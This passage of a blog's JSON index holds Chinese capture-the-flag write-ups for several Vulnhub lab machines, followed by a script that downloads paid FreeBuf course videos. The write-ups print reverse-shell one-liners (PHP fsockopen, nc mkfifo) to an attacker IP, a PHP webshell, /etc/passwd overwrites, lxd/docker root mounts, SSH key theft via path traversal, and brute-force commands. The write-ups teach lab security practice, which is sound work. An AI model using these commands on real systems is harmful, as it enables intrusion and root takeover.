NOPASSWD: /usr/bin/php 发现可以执行php php反弹shell即可: sudo php -r ‘$sock=fsockopen(“192.168.245.6”,9001);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’ 记得要加上sudo 不然无法得不到root权限 拿到第二个flag: gfriEND{56fbeef560930e77ff984b644fde66e7}","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/8/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Gears_of_war","date":"2020/06/30","text":"1.安装靶机 nmap扫描端口及服务 21,22,80,139,445 80端口服务没有可利用的点 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCUST) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: LOCUST) Service Info: Host: GEARS_OF_WARHost script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s |_nbstat: NetBIOS name: GEARS_OF_WAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: gears_of_war | NetBIOS computer name: GEARS_OF_WAR\\x00 | Domain name: \\x00 | FQDN: gears_of_war |_ System time: 2020-02-26T00:55:58+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-02-26T00:55:58 |_ start_date: N/A 开启了smb服务 使用smbmap工具扫描 smbmap -H 192.168.245.9 fr--r--r-- 332 Thu Oct 17 10:53:33 2019 msg_horda.zip ​ fr--r--r-- 198 Thu Oct 17 14:06:58 2019 SOS.txt ​ LOCUS_LAN$ READ ONLY LOCUST FATHER ​ IPC$ NO ACCESS IPC Service (gears_of_war server (Sam 发现LOCUS_LAN$是可读的 smbmap -H 192.168.245.9 -R LOCUS_LAN$ 发现也只有这两个文件 msg_horda.zip SOS.txt 使用smbclient工具下载这两个文件 smbclient //192.168.245.9/LOCUS_LAN$ 可以匿名登陆的 登陆后使用get命令下载到本地 使用enumlinux枚举用户: enum4linux -r 192.168.245.9 保存到user.txt 压缩包解压需要密码 SOS.txt 告知需要自己获取密码 提供了提示: @%%, 涉及到工具crunch密码字典生成 生成字典: crunch 4 4 -t @%%, -o password.txt 使用fcrack工具破解: fcrackzip -D -v -u -p password.txt msg_horda.zip 得到密码 r44M 解压后得到key.txt 内容: &quot;Vamos a atacar a los humanos con toda nuestras hordas, por eso puse en prision a el hombre mas peligroso que tenian, por lo que sin el son debiles.&quot; [[[[[[[[[[[[[[[[[[[[[&quot;3_d4y&quot;]]]]]]]]]]]]]]]]]]]] -General RAAM. 使用hydra工具尝试登陆ssh hydra -L user.txt -p 3_d4y ssh://192.168.245.9 -&gt; marcus可以登陆ssh 登陆后执行命令 echo $SHELL -&gt; /bin/rbash cd 等命令是不能执行的 返回ssh重新登陆 ssh marcus@192.168.245.9 -t “bash -noprofile” 这样的话执行某些命令就不会受到限制 查找特权程序: find /bin -type f -perm -u=s 2&gt;/dev/null ** /bin/cp /bin/mount /bin/ping /bin/fusermount /bin/su /bin/umount 利用cp命令将/etc/passwd覆盖达到提权的目的 将/etc/passwd 放到 /tmp目录下 cat /etc/passwd&gt;/tmp/passwd openssl生成用户密码: openssl passwd -1 -salt leng 123456 将root用户中的x替换 并添加到passwd中 将文件覆盖 :cp passwd /etc/passwd 切换用户 su leng 得到root权限 拿到flag","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/7/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Os-hacknos3","date":"2020/06/30","text":"安装靶机 nmap探测靶机ip,服务器版本及使用的端口和服务 发现开启 21,22,80端口 21端口是ftp服务 尝试登陆失败 gobuster扫描目录: gobuster dir -u http://192.168.245.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3- medium.txt -o dir-oshacknos3 -t 100 结果: /scripts (Status: 301) /devil (Status: 301) /websec (Status: 301) /server-status (Status: 403) devil websec页面提示在此页面找突破口 这种情况下 扫websec目录: 被扫描的目录太多,大多访问后页面无变化,这时 使用命令: gobuster dir -u [http://192.168.245.8/websec -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt](http://192.168.245.8/websec -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt) –wildcard -t 80 -l | grep -v 4644,4366,4346 可以减少无效的结果 发现敏感目录admin 访问后是后台 于是使用工具 cewl 生成密码字典爆破 cewl http://192.168.245.8/websec &gt; cewl.txt 后台页面审查元素: 邮箱尝试用websec首页的邮箱 contact@hacknos.com 使用工具hydra爆破: hydra -l contact@hacknos.com user -P cewl.txt 192.168.245.8 http-post-form “/websec/admin:username=^USER^&amp;password=^PASS^:Wrong email” 爆破出密码:Securityx 并登陆后台 在Themes主题中可以上传文件,上传一句话但不能访问,发现.htaccess文件内容限制了.php文件的访问,将内容删除即可. 然后还是常规反弹shell的操作… 反弹shell后复制一些敏感信息 upload.php config.php cat /etc/passwd 发现blackdevil用户 拿到user.txt 第一个flag:bae11ce4f67af91fa58576c1da2aad4b 下一步提权: 查找特权程序: find / -type f -perm -u=s 2&gt;/dev/null ** cpulimit这个程序貌似可以利用 cpulimit -l 50 -f /bin/bash 执行后发现权限是没有变化的 但是可以执行二进制文件的 写一个c语言程序进行提权: #include &lt;stdio.h&gt; \\#include &lt;stdlib.h&gt; \\#include &lt;unistd.h&gt; int main(int argc,char *argv[]) { ​ setreuid(0,0); ​ execve(&quot;/bin/bash&quot;,NULL,NULL); } 编译: gcc c.c -o cexp 用wget下载过去或base64编码复制过去都行的 执行命令提权: cpulimit -l 100 -f ./cexp 拿到第二个flag: bae11ce4f67af91fa58576c1da2aad4b 第二种提权方式: su 切换到blackdevil用户 id 查看用户组在docker中 下载docker镜像提权: docker run -v /:/mnt –rm -it alpine chroot /mnt sh 将靶机目录挂载到镜像中 因为镜像中的用户是root 用户 也就意味着提权 但是有些命令是不能执行的 将靶机根目录挂载到镜像中就行了 docker run -it 容器id -v /:/mbt","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/6/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Cynix","date":"2020/06/30","text":"知识点:nmap使用,ip地址转换, 文件读取,ssh密钥登陆lxd提权 1.安装靶机 使用命令进行全端口扫描: nmap -p- -T5 192.168.245.7 -&gt; 80,6688 对端口服务探测 nmap -p 80,6688 -sV 192.168.245.7 -oA cynix-port 发现ssh服务 gobuster扫描目录 -&gt; /lavalamp 对lavalamp 目录扫描 访问文件夹403 首页有表单 用 &lt;p&gt;test&lt;/p&gt;测试表单 提交后 得到canyoupassme.php文件 访问文件,检查元素: &lt;div&gt; Specify a number: &lt;input type=&quot;text&quot; name=&quot;file&quot; placeholder=&quot;integer&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;read&quot; value=&quot;Download the number&quot;&gt; &lt;/div&gt; 看到file参数想到文件读取,添加value参数,抓包 经过测试,就是要让我们绕过localhost，这里利用ip转换知识: https://rixx.de/blog/fun-legacy-ip-addresses/ 127.0.0.1-&gt; 2130706433 修改file=file=2130706433/../../etc/passwd 成功访问文件 发现只有ford和root用户可以登陆 ford用户目录在/home/ford中 之前通过nmap扫到6688是ssh服务,尝试获取用户的ssh密钥登陆服务器 修改file=file=2130706433/../../home/ford/.ssh/id_rsa 获得私钥 并保存在本地 更改权限 chmod 600 id_rsa 尝试用私钥登陆ssh成功 cat user.txt 拿到第一个flag:02d6267ed96e6b615b031dafe9607151 id 查看用户权限: uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd) 发现lxd(与docker类似) 利用lxd拿到第二个flag: 第一种方式: 创建容器:lxc init ubuntu:16.06 aleng -c security.privileged=true 然后进入容器 第二种方式: git clone https://github.com/saghul/lxd-alpine-builder 下载镜像工具 sudo ./build-alpine 下载镜像 lxc image import ./alpine-v3.11-x86_64-20200224_2341.tar.gz –alias aleng 导入镜像 lxc init aleng aleng -c security.privileged=true 创建容器 lxc config device add aleng aleng disk source=/ path=/mnt/root recursive=true 将靶机硬盘(/ 即根目录)挂载到容器目录/mnt/root中,如果访问/mnt/root这个目录的话就相当于访问了靶机的硬盘 (根目录) lxc start aleng 进入容器 lxc exec aleng /bin/sh 进入容器执行/bin/sh程序 id 查看是root权限,ifconfig 查看后是容器的root用户,说明是可以提权的 ls -al /mnt/root/root/ 得到root.txt cat /mnt/root/root/root.txt 拿到第二个flag:b0f971eddce7bd007e9f50ca02f5fe11","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/5/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Os-Bytesec","date":"2020/06/30","text":"1.安装靶机 2.gobuster扫目录 并没有关键信息 nmap 扫端口服务及版本探测 开启敏感端口及服务 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) ​ 使用nmap漏洞利用脚本探测: nmap -p 139,445 –script=smb-vuln-.nse –script-args=unsafe=1 192.168.245.3* 返回结果: Host script results: |_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug) |_smb-vuln-ms10-061: false | smb-vuln-regsvc-dos: | VULNERABLE: | Service regsvc in Microsoft Windows systems vulnerable to denial of service | State: VULNERABLE | The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference | pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes | while working on smb-enum-sessions. |_ 说明漏洞利用失败 利用smbmap工具进一步信息搜集: smbmap -H 192.168.245.3 [+] Finding open SMB ports…. [+] Guest SMB session established on 192.168.245.3… [+] IP: 192.168.245.3:445 Name: unknown ​ Disk Permissions Comment ​ —- ———– ——- ​ print$ NO ACCESS Printer Drivers ​ IPC$ NO ACCESS IPC Service (nitin server (Samba, Ubuntu)) ** 发现没有权限访问 ,可以匿名登陆 smbmap -H 192.168.245.3 -u admin 加上用户名访问后还是一样的结果 从着推断出 如果用户密码不对的话会用Guest用户进行访问,所以没有权限访问 使用enum4linux工具获取共享列表,目录 -S ​ Sharename Type Comment ​ ——— —- ——- ​ print$ Disk Printer Drivers ​ IPC$ IPC IPC Service (nitin server (Samba, Ubuntu)) ​ 等 不加参数扫描表示全方位的扫描 获取到用户名 [+] Enumerating users using SID S-1-22-1 and logon username ‘’, password ‘’ S-1-22-1-1000 Unix User\\sagar (Local User) S-1-22-1-1001 Unix User\\blackjax (Local User) S-1-22-1-1002 Unix User\\smb (Local User) 接着使用这三个用户尝试登陆 smbmap -H 192.168.245.3 -u smb 发现比之前两个登陆的用户多了数据 于是使用smbclient 获取文件 smbclient -L 192.168.245.3 -U smb 用命令尝试登陆三个用户后无果 猜测目录可能被隐藏并可能在/home/smb/ smbclient //192.168.245.3/home/smb -U smb 因为用这个软件登陆成功后用户的操作目录默认在自己的用户名目录中,并且登陆后不能切换用户 这里是 /smb中 所以: ​ smbclient //192.168.245.3/smb -U smb 登陆后可执行的命令有: ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. 等因为不能用cd 切换到根目录,所以把有用的文件下载到本地,默认保存当前目录 命令: get 文件名 得到 main.txt safe.zip main.txt 没flag 解压safe.zip提示加密 于是用fcracezip爆破密码: fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip -&gt; hacker1 解压文件 secret.jpg 用 xdg-open 打开 用exiftool工具打开后没什么可疑的数据 用wireshark打开 user.cap 并没发现可用的信息 SSID=blackjax 用aircrack-ng破解包: aricrack-ng -w /usr/share/wordlist/rockyou.txt user.cap 破解得到密码后 ssh登陆 cat user.txt 拿到第一个flag:f589a6959f3e04037eb2b3eb0ff726ac 第二个flag: 查找可执行程序 find / type f -perm -u=s 2&gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/i386-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/bin/newgidmap /usr/bin/gpasswd /usr/bin/newuidmap /usr/bin/chfn /usr/bin/passwd /usr/bin/chsh /usr/bin/at /usr/bin/pkexec /usr/bin/newgrp /usr/bin/netscan /usr/bin/sudo /bin/ping6 /bin/fusermount /bin/mount /bin/su /bin/ping /bin/umount /bin/ntfs-3g 发现有个 netscan 这个命令和 netstat -tnap 输出结果一样 netstat -tnap: Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:6010 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:2525 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp6 0 0 ::1:6010 :::* LISTEN - tcp6 0 0 :::445 :::* LISTEN - tcp6 0 0 :::2525 :::* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - Netscan: tcp 0 0 127.0.0.1:6010 0.0.0.0:* LISTEN 2583/0 tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN 858/smbd tcp 0 0 0.0.0.0:2525 0.0.0.0:* LISTEN 1071/sshd tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 1061/mysqld tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN 858/smbd tcp 0 296 192.168.245.3:2525 192.168.245.6:53400 ESTABLISHED 2521/sshd: blackjax tcp6 0 0 ::1:6010 :::* LISTEN 2583/0 tcp6 0 0 :::445 :::* LISTEN 858/smbd tcp6 0 0 :::2525 :::* LISTEN 1071/sshd tcp6 0 0 :::139 :::* LISTEN 858/smbd tcp6 0 0 :::80 :::* LISTEN 1106/apache2 对比两个发现,netscan权限是更高的 使用xxd工具也发现了netscan调用了netstat -tanp 命令: xxd /usr/bin/netscan 所以提权的思路就是: 执行netscan时会调用netstat命令,利用环境变量和netstat这个有执行权限的程序提权 后台查找root用户的执行程序 : ps aux 得到 /bin/sh 在 /tmp中创建文件: echo “/bin/sh” &gt; netscan 添加执行权限: chmod 777 netstat 查询系统变量：echo $PATH 添加环境变量: export PATH=/tmp:$PATH 提升权限: netscan cat root.txt 第二个flag:bae11ce4f67af91fa58576c1da2aad4b","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/4/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-OS-Hax","date":"2020/06/30","text":"1.安装靶机后 用nmap或netdiscover得到靶机ip 用gobuster扫到wordpress,img目录 用wpscan扫 192.168.56.106/wordpress 目录 得到登陆后台 img发现有可疑图片flaghost.png 用strings或exiftool工具看到可疑字符串pass@415 访问wordpress主页 发现并不能加载js 随意点击主页中的链接变成了localhost:// 这时修改 本机 /etc/hosts 文件 添加: loaclhost 192.168.56.106 重新访问后js等加载了,页面有一个web用户 尝试用web:pass@415登陆后台失败 \\2. 尝试访问 pass@415 目录 得到 brainfuck编码 得到web用户的密码 登陆后台成功 修改Theme的配置文件 添加一句话 &lt;?php system($_REQUEST[&#39;leng&#39;]);?&gt; 3.反弹shell,切换到python3 shell cat /etc/passwd 发现有用户web su 切换到 web用户 sudo -l 查看当前用户可执行的程序 发现可执行 awk ​ (root) NOPASSWD: /usr/bin/awk 在/etc/sudoers也可看到: ​ web ALL= (root) NOPASSWD: /usr/bin/awk 利用awk 提取 sudo awk ‘{system(“/bin/bash”)}’ 提权后cat final.txt flag: bae11ce4f67af91fa58576c1da2aad4b","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/3/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Trollcave","date":"2020/06/30","text":"知识点: nmap gobuster py脚本的编写 密码重置漏洞 ssh配置文件上传拿shell ubuntu16.04.04 提权 1.安装靶机后使用nmap探测目标ip 访问后发现不能注册用户,只能登陆用户,显示了用户名和角色,并且有20个左右的用户 尝试用不同的用户登陆,错误提示都不一样 此时应该写脚本爬出用户名,角色以及用户名登陆的错误信息,并写入文本中 爬出用户名以及角色: #coding:utf-8 import requests,re def get_userinfo(id): req = requests.get(&quot;http://192.168.56.101/users/%s&quot; % id).text #&lt;h1&gt;King&#39;s page&lt;/h1&gt; username = re.search(&#39;&lt;h1&gt;(.*?)\\&#39;&#39;,req).group(1) #&lt;b&gt; #Superadmin #&lt;/b&gt; userlevel = re.search(&#39;\\s&lt;b&gt;\\s(.*?)\\s&lt;/b&gt;&#39;,req).group(1) return username,userlevel for i in range(0,20): try: ​ username,userlevel = (get_userinfo(i)) ​ print(username + &#39;:&#39; + userlevel) except: ​ None 爬出用户名登陆后的错误提示: #coding:utf-8 import requests,re def get_userinfo(id): req = requests.get(&quot;http://192.168.56.101/users/%s&quot; % id).text #&lt;h1&gt;King&#39;s page&lt;/h1&gt; username = re.search(&#39;&lt;h1&gt;(.*?)\\&#39;&#39;,req).group(1) return username def get_logininfo(username): cookies = {&#39;_thirtytwo_session&#39;:&#39;OWdrYnNsYlZnWDFJc1N3ZlNFK0JtQm5jSUFzNDFCa21jclFBcEdiLzI0QmJtS1oxa1BLK3R4N1M4RW1JUmpYUVVrYU9idW81Q1daWk9aaHdLQy9xUGxMVmgwZS84M1M3TURvZm13ZWpuVjdTSUVBUHlxdUdtY3ovaVQ3N3RwdWZSdDM0ZHBiMnluc2tvZGRGREdlS2hnPT0tLWc0T3VlSUZYdEovTnI0dkNaOW5FL2c9PQ%3D%3D--52f1df3308000f03c63e7e03fe02314a87e98049&#39;} data = {&#39;authenticity_token&#39;:&#39;swjwIMKazz6UsuWnxLDWXbiH7mIavPpg4DIth8HYE7Pxxgi9rd6sMCtVWVRTPWw3GAKIwJE2nqP+cD25N+UlkQ==&#39;,&#39;session[name]&#39;:username,&#39;session[password]&#39;:&#39;123&#39;,&#39;commit&#39;:&#39;Log in&#39;} req2 = requests.post(&#39;http://192.168.56.101/login&#39;,data=data,cookies=cookies).text usernotice = re.search(&#39;notice\\&#39;&gt;(.*?)&lt;/div&gt;&#39;,req2).group(1) return username,usernotice #&lt;div id=&#39;notice&#39;&gt;:)&lt;/div&gt; for i in range(0,20): try: ​ username,usernotice = get_logininfo(get_userinfo(i)) ​ print(username + &#39;\\t&#39; + usernotice) except: ​ None 2.查看页面发现有密码重置的文章,百度可知是用ruby语言写的一个web应用程序rails 并且可以访问 password_resets/new 重置密码,但不能重置管理员的密码 重置登陆后有一个文件管理可以上传文件,上传一句话发现不能上传 File upload is currently disabled 这时可能是权限不够,看到重置密码的邮箱是这样的: http://192.168.56.101/password_resets/edit.OqOhuUHgvZocJN8BH5MM_A?name=xer 尝试修改King的密码 成功修改 属于密码重置漏洞 然后设置可以上传文件 上传一句话后并不能解析 尝试上传到根目录也不能解析 之前搜索到此网站是用ruby语言写的一个web应用程序,所以如果是php文件的话很大可 能不会解析的 3.第一步中nmap扫到22端口是开着的,所以尝试上传或替换ssh配置文件 生成rail用户密钥: ssh-keygen -f rails 一个公钥 一个私钥 将公钥重命名: mv rails.pub authorized_keys 上传时的路径 ../../../../../../home/rails/.ssh/authorized_keys ssh登陆: ssh -i id_rsa-rails rails@192.168.56.101 bash命令切换终端 接着查询版本是否可提权 cat /etc/lsb_release 16.04 ubuntu 搜索此版本exp 下载后本地编译后对它进行base64加密下,复制到靶机上,再base64 -d cve.64 &gt; cve 最后运行即可提权到root 或者直接复制到靶机上也行 flag: c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5 第二种提权方法: 查看可疑文件,将它们记下来: 数据库账号密码在database.yml 并且是sqlite3数据库 后缀为.sqlite的文件用命令进入数据库查询: sqlite3 数据库文件名 查询到所有用户的用户名及密码 查到可疑文件内容 private_messages: uFrrK3dXzWeZQ7JtGgZk4FT 前面了解到,rails这个web应用在本地会开启一个 3000端口 用命令 netstat -tnlp 查看开启的端口,还有8888,5432端口.但是浏览器不能访问,curl可以 于是做一个ssh端口转发: ssh -Nfg -L 3000:192.168.56.104:3000 aleng@192.168.56.104 可以端口转发后却不能访问… 先留着,日后再做解答","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/2/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Os-hackNos-1","date":"2020/06/30","text":"知识点: nmap,netdiscover的使用,gobuster爆破目录的使用,cms-exp的使用,getshell,反弹shell,linux的 提权 1.安装好靶机后,用以下命令探测靶机ip: nmap 192.168.56.0/24 netdiscover -I eth0 -r 192.168.56.0/24 这里有一个坑,指定ip段是扫不出来的,去掉就能扫出来 2.接着使用命令 nmap -sV -A -sC 192.168.56.102 -oA oshacknos1 探测操作系统和版本以及服务,将结果输出 3.接着使用gobuster扫描目录 命令: gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt drupal 访问后发现是一个cms 但是不能识别是什么版本,所以先官网下一个cms，看它有什么文件进而得到版本 经过测试发现版本是7.57 去github搜索发现有一个exp 4.exp是任意命令执行的 ls命令有一个sites文件夹,进去后看到settings.php,cat下拿到数据库账号密码 通过命令 创建一个shell文件,内容: &lt;?php system($_POST[&#39;a&#39;]);?&gt; 通过命令 python3 -m SimpleHTTPServer 8000 打开下载通道 通过exp 下载shell文件到网站目录下 并确保可以执行命令 5.接下来反弹shell 在kali中使用nc -lvnp 9001进行监听 然后使用命令 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.104 9001 &gt;/tmp/f 并且再burp中对它url编码 收到shell: 但是不能访问tty 类似于终端的东西 通过以下命令创建伪终端解决这个问题 python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ 暗月教程中的命令 其中pty是伪终端程序 pty.spawn 生成一个进程并连接在控制终端 可怎么都不能创建,后来发现是语法问题,不知道到我这就出问题了 python3 -c “import pty;pty.spawn(‘/bin/bash’)” 为了不让键入的命令显示出来,通过以下命令 stty raw -echo 在终端关闭命令的回显 nc -lvnp 9001 不知为何教程中可以这样操作 第一个flag: 既然如此,那就直接执行命令: cat /etc/passwd 发现有一个可疑用户 james cd到这个用户目录 发现 user.txt 中有一串加密的md5 解密后得到第一个flag 第二个flag: 发现可疑文件alexander.txt cat后并解密 echo &quot;KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==&quot; | base64 -d 得到 +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ ++.-- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;+++. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;. ++.++ +++++ +.--- ---.&lt; +++[- \\&gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-. &lt;+++[ -&gt;--- &lt;]&gt;-- -.+.- ---.+ ++.查询后是brainfuck编码 解码后得到:james:Hacker@4514 su 切换用户 失败 ssh登陆 失败 接下来只能提权 先查找有执行权限的程序: find / -perm -u=s -type f 2&gt;/dev/null 发现wget 有执行权限 所以通过替换靶机的/etc/passwd 切换用户拿到靶机的权限 使用命令对一个用户的密码加密,然后添加到 /etc/passwd openssl passwd -1 -salt leng 123456 -1 表示使用md5算法 -salt指定salt值,不适用 随机的salt值 $1$leng$M/raGbgc7Roz2E4Mjjt1U0 然后替换root:x:0:0:root:/root:/bin/bash 后得到 root:$1$leng$M/raGbgc7Roz2E4Mjjt1U0:0:0:root:/root:/bin/bash 这样的话leng 这个用户就是root用户的权限 最后使用命令 wget “http://192.168.56.104:8000/passwd&quot; -O /etc/passwd 替换靶机/etc/passwd 切换用户 leng 密码123456 成功拿到root权限 拿到flag:bae11ce4f67af91fa58576c1da2aad4b","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/1/","photos":[]},{"tags":[],"title":"如何爬取freebuf视频","date":"2020/06/30","text":"前提注册了freebuf的账号,买了付费的课程,但是懒得每次打开浏览器点击,想爬取视频到本地观看的 下载了ffmpeg工具,专门合成加载了m3u8链接的视频 爬取思路获取视频标题 -&gt; 获取视频url -&gt; 获取视频加载的m3u8的url -&gt; 调取系统命令 爬取解析视频标题比如这个CTF付费的课程,我这边是已经购买了的,就用它来试了 F12可以看到视频的标题,url等 原本打算用xpath获取的,发现不成功.后来知道它是动态页面,也就是它的标题和url在源代码中是看不到的 然后抓包看到它加载了一个json包,一看都包含了标题和url 所以就是怎么获取json中的数据问题了 那么肯定是要json模块去解析了,刚开始不懂,查了很多资料,发现以这样格式取的 a=json.loads(b) c=a[][][][][]问题:标题在列表中的字典中,你怎么知道它有多少个列表?while循环就行了 request = requests.get(url,headers=headers).text request_data = json.loads(request) #request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][3][&#39;name&#39;] title_data = request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;] m = 0 n = 0 title_name = [] while m &lt; len(title_data): ​ while n &lt; len(title_data[m][&#39;son&#39;]): ​ title_name.append(title_data[m][&#39;son&#39;][n][&#39;name&#39;]) ​ n += 1 ​ n = 0 ​ m += 1 return (title_name)效果: 这只是一部分 实践出真理,自己操作了才懂. 视频url同获取视频标题的url一样 问题:这样获取的url是相对的?加上host列表循环下就行了 host_url = &#39;https://live.freebuf.com&#39; req = requests.get(url,headers=headers).text data = json.loads(req) \\#data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][0][&#39;url&#39;] uri_data_one = data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;] uri_one = [] k = 0 i = 0 while (k &lt; len(uri_data_one)): ​ while i &lt; len(uri_data_one[k][&#39;son&#39;]): ​ uri_one.append(uri_data_one[k][&#39;son&#39;][i][&#39;url&#39;]) ​ i += 1 ​ i = 0 ​ k += 1 url_one = [host_url + j for j in uri_one]效果 视频的m3u8链接到了这步,说明肯定获取了视频的url 访问视频url,F12中可以看到m3u8的链接,所以原本想法是selenium模块去请求的,发现好像无法操作.然后了解到使用了js去拼接了m3u8的链接,访问链接内容就是m3u8的链接.这里需要不断的抓包才能发现不一样的请求 比如 https://live.freebuf.com/live/0b230d3e53b72179d78d204b72769a85/s_621 开启抓包 接着forward包 发送了两次或三次就看到了这个包 换一个视频url请求 也不断地以这种方式发包,发现这个包的链接的末几位是变化的 问题:怎么获取最高清视频的m3u8链接?视频大小越大,越高清.所以先获取比较数据,从而得到列表的索引,取出数据 接下来就是想办法知道这个包的url是怎么动态获取的 然后抓取第一个包的时候就回显在js中 那个fileID就拼接在 getplayinfo/v2/1251001764 后面 所以到这思路就很明显了: 请求首页获取fileID,然后拼接url 具体的话实际操作便知 调用系统命令这里就是对爬取的数据进行读取,然后启用命令即可,具体看代码 最后代码如下 import requests import os import json import re url = &quot;https://live.freebuf.com/course/detail/?id=0b230d3e53b72179d78d204b72769a85&quot; def download_video(): fo = open(&#39;video_data.txt&#39;,&#39;r&#39;,encoding=&#39;utf8&#39;) for line in fo.readlines(): ​ filter_line = line.strip(&#39;\\n&#39;) ​ title = re.findall(&#39;^title:(.*) \\+ url:+&#39;,filter_line) ​ m3u8_url = re.findall(&#39; \\+ m3u8:(.*)&#39;,filter_line) ​ \\#print (m3u8_url) ​ cmd = &#39;D:\\\\ProgramFiles\\\\ffmpeg-20200608-d29aaf1-win64-static\\\\ffmpeg-20200608-d29aaf1-win64-static\\\\bin\\\\ffmpeg.exe -headers &#39; + &#39;&quot;Referer: https://live.freebuf.com/live/0b230d3e53b72179d78d204b72769a85/s_628&quot; &#39; + &#39;-i &#39; + m3u8_url[0] + &#39; -c copy &#39; + title[0] + &#39;.mp4&#39; ​ \\#ffmpeg的路径,Referer,文件名根据实际情况更改 ​ \\#print (cmd) ​ os.system(cmd) def get_url(): headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot; } host_url = &#39;https://live.freebuf.com&#39; req = requests.get(url,headers=headers).text data = json.loads(req) \\#data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][0][&#39;url&#39;] uri_data_one = data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;] uri_one = [] 